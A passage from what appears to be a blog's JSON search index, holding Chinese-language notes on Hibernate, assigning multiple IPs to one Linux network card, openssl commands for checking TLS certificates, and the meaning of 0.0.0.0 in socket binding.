建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"session save update delete get ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:8:0","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"hibernate 3 種狀態 瞬時態 物件匋有id，session 沒有關聯 持久態 物件有id、session 有關聯 這邊沒有做save，當正常commit的話 持久態會做資料寫入到資料庫 一級緩存還會提到 托管態 物件有id，session 沒有關聯 ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:9:0","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"緩存 ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:10:0","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"一級緩存 通常使用 持久態 沒做 save/update，交易 commit 時候會寫入到資料庫 ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:10:1","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"二級緩存 默認不使用 通常現在使用 redis 代替 生命週期是 SessionFactory ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:10:2","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"getCurrentSession threadlocal ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:11:0","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"不用 close ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:11:1","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"不用在大量資料 test ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:11:2","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"三種 API ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:12:0","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"Query 使用 HQL 介於 實體類 和 SQL 之間 ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:12:1","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"Criteria 使用實體類 ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:12:2","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"SQLQuery 原生 SQL ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:12:3","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"Entity 建立 Hibernate入门之主键生成策略详解_博客_云社区_开发者中心-华为云 5.4. Spring Data with MySQL ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:13:0","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"實體類關聯 ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:14:0","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"一對多 通常 進階探討 hibernate基于注解的维护权反转：@OneToMany(mappedBy=) - bojiangzhou - 博客园 1. 設定 2. 聯級 ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:14:1","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"多對多 @ManyToMany中间表附加字段设计 - rubekid - 博客园 Hibernate中多对多的annotation的写法（中间表可以有多个字段） - MJBrian - 博客园 ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:14:2","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"一對一 Hibernate —— HQL与QBC的区别_tuxq5721-CSDN博客_hql和qbc ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:14:3","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"問題 ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:15:0","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"org.hibernate.ObjectNotFoundException org.hibernate.ObjectNotFoundException: No row with the given identifier exists - keepup~ - 博客园 org.hibernate.ObjectNotFoundException: No row with the given identifier exists ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:15:1","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"hibernate -\u003e Spring Data JPA Java Artisan / Neil Chan: 從 Spring + Hibernate 到 Spring Data JPA SpringBoot系列 - 集成Hibernate | 飞污熊博客 第一個hibernate程式 - 國立中山大學程式諮詢網 ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:15:2","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"junit 使用 spring 做 DAO 查詢，最外層沒辦法做 dao 查詢 「快學springboot」在springboot中寫單元測試 - Toments 找話題 Spring / Hibernate / JUnit - No Hibernate Session bound to Thread - Stack Overflow ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:16:0","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"Hibernate Set / List 【学习笔记】Hibernate中多对多不用List而用Set的原因分析_机智猫-CSDN博客_多对多关系用set还是list Hibernate的抓取策略及优化 - 簡書 java - What are the differences between the different saving methods in Hibernate? - Stack Overflow ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:17:0","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["網路"],"content":"故事是這樣的，最近我們公司有多個專案，聽到都是放在獨立機器，各自一組IP。 最近我不小心 FTP 設定錯 IP，但是上傳檔案上去。發現 http server(IP對的)竟然更新了。 我覺得很奇怪不是不同台電腦，後來發現那一台設定很多虛擬 IP。 讓我們研究公司是如何省錢的 其實這個用途看到用一台電腦需要跨網段使用 不需要切換 IP 但不知道數量是不是有限制 用台多會不會有缺點? 這名詞叫 IP Alias 鳥哥的 Linux 私房菜 – 架設 Router ","date":"2020-05-30","objectID":"/blog/posts/%E4%B8%80%E5%BC%B5%E7%B6%B2%E5%8D%A1%E4%BD%BF%E7%94%A8%E5%A4%9A%E7%B5%84-IP-%E6%96%B9%E6%B3%95/:0:0","tags":["ip","linux"],"title":"一張網卡使用多組 IP 方法","uri":"/blog/posts/%E4%B8%80%E5%BC%B5%E7%B6%B2%E5%8D%A1%E4%BD%BF%E7%94%A8%E5%A4%9A%E7%B5%84-IP-%E6%96%B9%E6%B3%95/"},{"categories":["網路"],"content":"window 很簡單，去控制台設定，自動 dhcp 要先取消掉 IP 設定多組 ","date":"2020-05-30","objectID":"/blog/posts/%E4%B8%80%E5%BC%B5%E7%B6%B2%E5%8D%A1%E4%BD%BF%E7%94%A8%E5%A4%9A%E7%B5%84-IP-%E6%96%B9%E6%B3%95/:1:0","tags":["ip","linux"],"title":"一張網卡使用多組 IP 方法","uri":"/blog/posts/%E4%B8%80%E5%BC%B5%E7%B6%B2%E5%8D%A1%E4%BD%BF%E7%94%A8%E5%A4%9A%E7%B5%84-IP-%E6%96%B9%E6%B3%95/"},{"categories":["網路"],"content":"簡單設定 sudo ifconfig wlp3s0:0 192.168.0.1 ifconfig wlp3s:0 down # 重新匯入網路 sudo /etc/init.d/networking restart # 這邊我是用下面這個才成功 service network-manager restart 鳥哥的 Linux 私房菜 – Linux 常用網路指令介紹 查看狀態ip -4 a 3: wlp3s0: \u003cBROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc noqueue state UP group default qlen 1000 inet 192.168.1.117/24 brd 192.168.1.255 scope global dynamic noprefixroute wlp3s0 valid_lft 76153sec preferred_lft 76153sec inet 192.168.1.150/24 brd 192.168.1.255 scope global secondary wlp3s0:0 valid_lft forever preferred_lft forever ","date":"2020-05-30","objectID":"/blog/posts/%E4%B8%80%E5%BC%B5%E7%B6%B2%E5%8D%A1%E4%BD%BF%E7%94%A8%E5%A4%9A%E7%B5%84-IP-%E6%96%B9%E6%B3%95/:1:1","tags":["ip","linux"],"title":"一張網卡使用多組 IP 方法","uri":"/blog/posts/%E4%B8%80%E5%BC%B5%E7%B6%B2%E5%8D%A1%E4%BD%BF%E7%94%A8%E5%A4%9A%E7%B5%84-IP-%E6%96%B9%E6%B3%95/"},{"categories":["網路"],"content":"永久加入設定 $ /etc/network/interfaces 檔案加入下列內容 auto lo iface lo inet loopback iface enp0s25 inet static address 192.168.1.168 netmask 255.255.255.0 gateway 192.168.1.254 ### 新增第二筆網卡設定 auto enp0s25:0 inet static address 192.168.1.169 netmask 255.255.255.0 gateway 192.168.1.254 參考:[Ubuntu] 單網卡綁多IP - Frank Lin - Medium 然後透過 bind port 各自綁多台 IP 這樣就能一台當多台用了 XYZ的筆記本: Linux 網卡新增多個IP ","date":"2020-05-30","objectID":"/blog/posts/%E4%B8%80%E5%BC%B5%E7%B6%B2%E5%8D%A1%E4%BD%BF%E7%94%A8%E5%A4%9A%E7%B5%84-IP-%E6%96%B9%E6%B3%95/:1:2","tags":["ip","linux"],"title":"一張網卡使用多組 IP 方法","uri":"/blog/posts/%E4%B8%80%E5%BC%B5%E7%B6%B2%E5%8D%A1%E4%BD%BF%E7%94%A8%E5%A4%9A%E7%B5%84-IP-%E6%96%B9%E6%B3%95/"},{"categories":["網路"],"content":"其他 OS 設定方法 CentOS Linux 靜態 IP 位址網路設定教學 - G. T. Wang Ubuntu 18.04 透過 netplan 設定網路卡 IP - Soul \u0026 Shell Blog ","date":"2020-05-30","objectID":"/blog/posts/%E4%B8%80%E5%BC%B5%E7%B6%B2%E5%8D%A1%E4%BD%BF%E7%94%A8%E5%A4%9A%E7%B5%84-IP-%E6%96%B9%E6%B3%95/:1:3","tags":["ip","linux"],"title":"一張網卡使用多組 IP 方法","uri":"/blog/posts/%E4%B8%80%E5%BC%B5%E7%B6%B2%E5%8D%A1%E4%BD%BF%E7%94%A8%E5%A4%9A%E7%B5%84-IP-%E6%96%B9%E6%B3%95/"},{"categories":["網路"],"content":"使用上設定防火牆陷阱 最近公司AP Server 程式使用 mail 發信的時候 明明有設定防火牆開通 IP 結果不能發出去 後來發現是 AP Server IP 是吃別的 IP 這邊 mail server 是不同網段，所以會走 gateway IP Gateway 預設不是走 interface AP 這邊 可以用 ip route show 主要是看這一行 default via 192.168.1.1 dev eth0 src 192.168.1.202 metric 202 ","date":"2020-05-30","objectID":"/blog/posts/%E4%B8%80%E5%BC%B5%E7%B6%B2%E5%8D%A1%E4%BD%BF%E7%94%A8%E5%A4%9A%E7%B5%84-IP-%E6%96%B9%E6%B3%95/:2:0","tags":["ip","linux"],"title":"一張網卡使用多組 IP 方法","uri":"/blog/posts/%E4%B8%80%E5%BC%B5%E7%B6%B2%E5%8D%A1%E4%BD%BF%E7%94%A8%E5%A4%9A%E7%B5%84-IP-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"單純紀錄 TODO: 有空回來整理 Test FTP certificate openssl s_client -connect server.yourwebhoster.eu:21 -starttls ftp Test POP3 certificate openssl s_client -connect server.yourwebhoster.eu:995 Test IMAP certificate openssl s_client -connect server.yourwebhoster.eu:993 Test SMTP SSL certificate openssl s_client -connect server.yourwebhoster.eu:465 Test SMTP TLS certificate openssl s_client -connect server.yourwebhoster.eu:587 -starttls smtp Test HTTPS certificate openssl s_client -connect server.yourwebhoster.eu:443 Test DirectAdmin certificate openssl s_client -connect server.yourwebhoster.eu:2222 How to verify SSL certificates with SNI (Server Name Indication) using OpenSSL Using SNI with OpenSSL is easy. Just add the -servername flag and you are good to go. Replace in the examples below mail.domain.com with the SNI name. Note: you can also use the SNI name to replace server.yourwebhoster.eu with. Test FTP certificate openssl s_client -connect server.yourwebhoster.eu:21 -starttls ftp -servername mail.domain.com Test POP3 certificate openssl s_client -connect server.yourwebhoster.eu:995 -servername mail.domain.com Test IMAP certificate openssl s_client -connect server.yourwebhoster.eu:993 -servername mail.domain.com Test SMTP SSL certificate openssl s_client -connect server.yourwebhoster.eu:465 -servername mail.domain.com Test SMTP TLS certificate openssl s_client -connect server.yourwebhoster.eu:587 -starttls smtp -servername mail.domain.com Test HTTPS certificate openssl s_client -connect server.yourwebhoster.eu:443 -servername mail.domain.com 讀取網站憑證指紋 echo | openssl s_client -connect www.cgmh.org.tw:443 |\u0026 openssl x509 -fingerprint -noout 網站憑證鏈指紋 echo \"\" | openssl s_client -showcerts \\ -connect saucelabs.com:443 2\u003e\u00261 | \\ sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p; /-END CERTIFICATE-/a\\\\x0' |\\ sed -e '$ d' | xargs -0rl -I% sh -c \"echo '%' | \\ openssl x509 -fingerprint -noout -sha256 -subject\" 參考sni - Different SHA1 fingerprint in browser and openssl - Stack Overflow 但根憑證好像算錯了? sha1,sha256,md5 SHA-256 openssl x509 -noout -fingerprint -sha256 -inform pem -in [certificate-file.crt] SHA-1 openssl x509 -noout -fingerprint -sha1 -inform pem -in [certificate-file.crt] MD5 openssl x509 -noout -fingerprint -md5 -inform pem -in [certificate-file.crt] How to view a certificate fingerprint as SHA-256, SHA-1 or MD5 using OpenSSL for RSA Authentication … - RSA Link - 4230 Certificate Decoder - Decode certificates to view their contents SSL 相關的測試工具 – 軟體品管的專業思維 SSLScan - 瞭解網站是否安全的好用小工具 OpenSSL command cheatsheet ","date":"2020-05-30","objectID":"/blog/posts/Linux-%E6%8C%87%E4%BB%A4%E7%A2%BA%E8%AA%8DSSL%E6%86%91%E8%AD%89/:0:0","tags":null,"title":"Linux 指令確認SSL憑證","uri":"/blog/posts/Linux-%E6%8C%87%E4%BB%A4%E7%A2%BA%E8%AA%8DSSL%E6%86%91%E8%AD%89/"},{"categories":["網路"],"content":"我們常常使用架一些程式服務 都會設定 host(0.0.0.0) 通常都會認為開 port 也知道對 ip 設定 192.168.1.111 也有看過對 192.168.1.0 設定（會當下看網路卡 ip） 我沒認真探討 此篇可能有誤，歡迎指正，請手下留情 故事是這樣的，最近我們公司有多個專案，聽到都是放在獨立機器，各自一組IP。 最近我不小心 FTP 設定錯 IP，但是上傳檔案上去。發現 http server(IP對的)竟然更新了。 我覺得很奇怪不是不同台電腦，後來發現那一台設定很多虛擬 IP。 這之後也會寫一個文章，怎麼實做看看。 不過…，為什麼可以在很多台開同一個 port 呢? 後來發現 port 是綁在網卡上面…，一台電腦多個IP綁很多個 http (80port) ","date":"2020-05-30","objectID":"/blog/posts/0-0-0-0-%E6%98%AF%E4%BB%80%E9%BA%BC%E5%B0%8F%E7%9F%A5%E8%AD%98/:0:0","tags":["ip","port"],"title":"0.0.0.0 是什麼小知識","uri":"/blog/posts/0-0-0-0-%E6%98%AF%E4%BB%80%E9%BA%BC%E5%B0%8F%E7%9F%A5%E8%AD%98/"},{"categories":["網路"],"content":"簡單敘說 IP 基本 IPv4 就不仔細說 IP 預設常見 Class 分級 Class A Class B Class C 很多網頁有說，這邊不仔細講，主要預設切出來網址都是固定的。 可參考:IP位址分五種等級 CIDR 網域切割 通常我一直搞不懂為什麼有分Class A,Class B, Class C ，然後後續討論可以自訂網路遮罩切割網域 後來最近爬了一下，因為有了 CIDR，所以每一台電腦都可以設定網路遮罩 可細分切出多種網路 IP 詳細:CIDR 路徑協定 ","date":"2020-05-30","objectID":"/blog/posts/0-0-0-0-%E6%98%AF%E4%BB%80%E9%BA%BC%E5%B0%8F%E7%9F%A5%E8%AD%98/:1:0","tags":["ip","port"],"title":"0.0.0.0 是什麼小知識","uri":"/blog/posts/0-0-0-0-%E6%98%AF%E4%BB%80%E9%BA%BC%E5%B0%8F%E7%9F%A5%E8%AD%98/"},{"categories":["網路"],"content":"特殊 IP ","date":"2020-05-30","objectID":"/blog/posts/0-0-0-0-%E6%98%AF%E4%BB%80%E9%BA%BC%E5%B0%8F%E7%9F%A5%E8%AD%98/:2:0","tags":["ip","port"],"title":"0.0.0.0 是什麼小知識","uri":"/blog/posts/0-0-0-0-%E6%98%AF%E4%BB%80%E9%BA%BC%E5%B0%8F%E7%9F%A5%E8%AD%98/"},{"categories":["網路"],"content":"127.0.0.1 簡單就是我們常用的 localhost 127.0.0.1屬於{127,}集合中的一個，而所有網絡號為127的地址都被稱之為迴環地址，所以迴環地址！=127.0.0.1,它們是包含關係，即迴環地址包含127.0.0.1。 ","date":"2020-05-30","objectID":"/blog/posts/0-0-0-0-%E6%98%AF%E4%BB%80%E9%BA%BC%E5%B0%8F%E7%9F%A5%E8%AD%98/:2:1","tags":["ip","port"],"title":"0.0.0.0 是什麼小知識","uri":"/blog/posts/0-0-0-0-%E6%98%AF%E4%BB%80%E9%BA%BC%E5%B0%8F%E7%9F%A5%E8%AD%98/"},{"categories":["網路"],"content":"0.0.0.0 這邊127.0.0.1和0.0.0.0地址的区别 - 知乎有爬到一些相關知識 不過內容好像也不是很正確 擷取一些回覆 「0.0.0.0是本網絡中的本主機」這種老掉牙中文教科書說法就不要提了。實際上外文資料/軟件裡一般把0.0.0.0稱為「unspecified」，即未指定（即無效的，無意義的）地址。從功能上看，一般用於某些程序/網絡協議中不便使用具體ip的特殊情況（說白了就是一個用於某些比較坑的情況的「佔位符」），比如DHCP客戶端還未獲取到ip的時候規定使用0.0.0.0作「源地址」，或者服務器不指定在哪個網卡上監聽時，也使用0.0.0.0。 其他也有找到ip - What is the difference between 0.0.0.0, 127.0.0.1 and localhost? - Stack Overflow IPV4中，0.0.0.0地址被用於表示一個無效的，未知的或者不可用的目標。 在服務器中，0.0.0.0指的是本機上的所有IPV4地址，如果一個主機有兩個IP地址，192.168.1.1 和 10.1.2.1，並且該主機上的一個服務監聽的地址是0.0.0.0,那麼通過兩個ip地址都能夠訪問該服務。 在路由中，0.0.0.0表示的是默認路由，即當路由表中沒有找到完全匹配的路由的時候所對應的路由。 ———————————————— 版权声明：本文为CSDN博主「ythunder」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。 原文链接：https://blog.csdn.net/ythunder/java/article/details/61931080 INADDR_ANY NADDR_ANY介紹 INADDR_ANY 指定地址為0.0.0.0的地址，這個地址事實上表示不確定地址或“所有地址”、“任意地址”。一般來說，在各個系統中均定義成為0值。 INADDR_ANY 的具體含義是，綁定到0.0.0.0。此時，對所有的地址都將是有效的，如果系統考慮採用多個網卡的話，那麼使用此種bind，將在所有網卡上進行綁定。在這種情況下，你可以收到發送到所有有效地址上封包。 參考:【Socket】INADDR_ANY of SOCKET Programming «＊～【ＢｕｂＵｓＨａＲｅ】～＊ ＊～【ＢｕｂＵｓＨａＲｅ】～＊ ","date":"2020-05-30","objectID":"/blog/posts/0-0-0-0-%E6%98%AF%E4%BB%80%E9%BA%BC%E5%B0%8F%E7%9F%A5%E8%AD%98/:2:2","tags":["ip","port"],"title":"0.0.0.0 是什麼小知識","uri":"/blog/posts/0-0-0-0-%E6%98%AF%E4%BB%80%E9%BA%BC%E5%B0%8F%E7%9F%A5%E8%AD%98/"},{"categories":["網路"],"content":"其他特殊IP 2.3 特殊IP地址 特殊IP地址就是用來做一些特殊的事情。RFC1700中定義了以下特殊IP地址。 {0,0}:網絡號和主機號都全部為0，表示「本網絡上的本主機」，只能用作源地址。 {0，host-id}:本網絡上的某台主機。只能用作源地址。 {-1,-1}：表示網絡號和主機號的所有位上都是1（二進制），用於本網絡上的廣播，只能用作目的地址，發到該地址的數據包不能轉發到源地址所在網絡之外。 {net-id,-1}:直接廣播到指定的網絡上。只能用作目的地址。 {net-id,subnet-id,-1}:直接廣播到指定網絡的指定子網絡上。只用作目的地址。 {net-id,-1,-1}:直接廣播到指定網絡的所有子網絡上。只能用作目的地址。 {127，}:即網絡號為127的任意ip地址。都是內部主機迴環地址(loopback),永遠都不能出現在主機外部的網絡中。 這編原本我看不懂{}裡面的意思 後來查了一下 IP 有分{Net_id,Host_id} 簡單來說這邊 Host_id 就把他想成能用的 IP 0是整個填 0，-1就是整個填1 10.x.x.x 172.16。x。x∼172.31。x。x 192.168。x。x 私有位址，這些位址被大量用於企業內部網路中。 224.0.0.1 其他參考: 【TCP/IP】IP地址分类和特殊IP地址_网络_Yngz_Miao的博客-CSDN博客 網路教學-IP 位址 ","date":"2020-05-30","objectID":"/blog/posts/0-0-0-0-%E6%98%AF%E4%BB%80%E9%BA%BC%E5%B0%8F%E7%9F%A5%E8%AD%98/:2:3","tags":["ip","port"],"title":"0.0.0.0 是什麼小知識","uri":"/blog/posts/0-0-0-0-%E6%98%AF%E4%BB%80%E9%BA%BC%E5%B0%8F%E7%9F%A5%E8%AD%98/"},{"categories":["網路"],"content":"觀察監聽 port ","date":"2020-05-30","objectID":"/blog/posts/0-0-0-0-%E6%98%AF%E4%BB%80%E9%BA%BC%E5%B0%8F%E7%9F%A5%E8%AD%98/:3:0","tags":["ip","port"],"title":"0.0.0.0 是什麼小知識","uri":"/blog/posts/0-0-0-0-%E6%98%AF%E4%BB%80%E9%BA%BC%E5%B0%8F%E7%9F%A5%E8%AD%98/"},{"categories":["網路"],"content":"windows netstat -ano C:\\Users\\Administrator\u003enetstat -ano 使用中連線 協定 本機位址 外部位址 狀態 PID TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 480 TCP 127.0.0.1:10400 0.0.0.0:0 LISTENING 7708 TCP 127.0.0.1:10401 0.0.0.0:0 LISTENING 7708 TCP 127.0.0.1:10402 0.0.0.0:0 LISTENING 7708 TCP 127.0.0.1:10403 0.0.0.0:0 LISTENING 7708 TCP 127.0.0.1:10403 127.0.0.1:2362 ESTABLISHED 7708 TCP 127.0.0.1:15292 0.0.0.0:0 LISTENING 6320 TCP 192.168.1.107:139 0.0.0.0:0 LISTENING 4 看邊主要看 LISTENING 可以看到有開那些 port 第一個 80 port 會對所有網路卡 ","date":"2020-05-30","objectID":"/blog/posts/0-0-0-0-%E6%98%AF%E4%BB%80%E9%BA%BC%E5%B0%8F%E7%9F%A5%E8%AD%98/:3:1","tags":["ip","port"],"title":"0.0.0.0 是什麼小知識","uri":"/blog/posts/0-0-0-0-%E6%98%AF%E4%BB%80%E9%BA%BC%E5%B0%8F%E7%9F%A5%E8%AD%98/"},{"categories":["網路"],"content":"Linux netstat -pnltu 更多可看:Linux 安裝及使用 netstat ","date":"2020-05-30","objectID":"/blog/posts/0-0-0-0-%E6%98%AF%E4%BB%80%E9%BA%BC%E5%B0%8F%E7%9F%A5%E8%AD%98/:4:0","tags":["ip","port"],"title":"0.0.0.0 是什麼小知識","uri":"/blog/posts/0-0-0-0-%E6%98%AF%E4%BB%80%E9%BA%BC%E5%B0%8F%E7%9F%A5%E8%AD%98/"},{"categories":["網路"],"content":"設定 apache port 觀察 0.0.0.0 # If you just change the port or add more ports here, you will likely also # have to change the VirtualHost statement in # /etc/apache2/sites-enabled/000-default.conf Listen 80 Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:111 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:56081 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:631 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:7070 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:160 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:2049 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:54401 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:42979 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:51523 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp6 0 0 :::111 :::* LISTEN - tcp6 0 0 :::80 :::* LISTEN - 192.168.1.x Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:111 0.0.0.0:* LISTEN - tcp 0 0 192.168.1.117:80 0.0.0.0:* LISTEN - 192.168.1.0 Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:111 0.0.0.0:* LISTEN - tcp 0 0 192.168.1.0:80 0.0.0.0:* LISTEN - 這個目前沒找到相關文獻 但是我發現 這個好像是廣播網路? 預設會跟所有 192.168 網路卡做 bind port(尚未測試兩個相同網段IP) 這邊也不是打 192.0.0.0 就可以設定 ","date":"2020-05-30","objectID":"/blog/posts/0-0-0-0-%E6%98%AF%E4%BB%80%E9%BA%BC%E5%B0%8F%E7%9F%A5%E8%AD%98/:4:1","tags":["ip","port"],"title":"0.0.0.0 是什麼小知識","uri":"/blog/posts/0-0-0-0-%E6%98%AF%E4%BB%80%E9%BA%BC%E5%B0%8F%E7%9F%A5%E8%AD%98/"},{"categories":["網路"],"content":"其他有趣東西 ","date":"2020-05-30","objectID":"/blog/posts/0-0-0-0-%E6%98%AF%E4%BB%80%E9%BA%BC%E5%B0%8F%E7%9F%A5%E8%AD%98/:5:0","tags":["ip","port"],"title":"0.0.0.0 是什麼小知識","uri":"/blog/posts/0-0-0-0-%E6%98%AF%E4%BB%80%E9%BA%BC%E5%B0%8F%E7%9F%A5%E8%AD%98/"},{"categories":["網路"],"content":"iperf 指令測試 IP 傳輸速度 通常我們在 Linux 下面可以透過 Iometer 去測試硬碟的效能速度,那網路呢!!要以免費最簡單使用的就算是 iperf 了. Linux command – iperf – Benjr.tw Linux – iperf (Bind to host) – Benjr.tw ","date":"2020-05-30","objectID":"/blog/posts/0-0-0-0-%E6%98%AF%E4%BB%80%E9%BA%BC%E5%B0%8F%E7%9F%A5%E8%AD%98/:5:1","tags":["ip","port"],"title":"0.0.0.0 是什麼小知識","uri":"/blog/posts/0-0-0-0-%E6%98%AF%E4%BB%80%E9%BA%BC%E5%B0%8F%E7%9F%A5%E8%AD%98/"},{"categories":["Java"],"content":"平常不怎麼使用 Enum 